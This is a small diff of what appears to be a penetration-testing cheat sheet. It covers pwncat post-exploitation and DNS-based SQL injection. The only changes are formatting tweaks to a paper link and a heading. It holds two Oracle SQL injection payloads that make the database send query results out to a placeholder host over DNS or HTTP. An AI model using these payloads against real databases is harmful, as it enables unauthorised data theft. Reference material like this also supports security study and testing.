@@ -638,9 +638,9 @@ https://github.com/calebstewart/pwncat
 <br># pwncat is a post-exploitation platform for Linux targets.
 
 ### SQLi (SQL Injection)
-<br># https://arxiv.org/abs/1303.3047
+https://arxiv.org/abs/1303.3047
 <br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.
-<br># DNS Detection
+
 <br># Oracle
 <br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
 <br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
